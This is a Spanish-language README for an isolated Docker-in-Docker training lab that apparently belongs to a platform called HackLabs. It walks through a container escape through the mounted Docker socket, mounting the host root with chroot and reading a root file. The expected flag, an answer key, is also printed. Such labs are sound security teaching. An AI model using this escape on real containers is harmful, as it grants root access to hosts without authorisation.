# Escenario Ad-Hoc de Docker Escape

Este laboratorio aislado usa Docker-in-Docker para que los comandos de explotación funcionen incluso cuando el contenedor principal de HackLabs no expone `/var/run/docker.sock`.

## Inicio

```bash
docker compose -f docker-compose.docker-escape.yml up -d --build
```

## Entrar al contenedor víctima

```bash
docker exec -it hacklabs-escape-victim sh
```

## Validar prerrequisitos (dentro de la víctima)

```bash
ls /.dockerenv
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/_ping
```

Respuesta esperada de `_ping`: `OK`

## Comandos de escape por socket (dentro de la víctima)

```bash
docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
cat /root/root.txt
```

La flag esperada es `HL{c0n741n3r_35c4p3_h057_4cc355}`.

Nota: el "host" accesible tras el escape es el del escenario ad-hoc aislado, no el sistema operativo principal que ejecuta HackLabs.

## Detener y limpiar

```bash
docker compose -f docker-compose.docker-escape.yml down -v
```
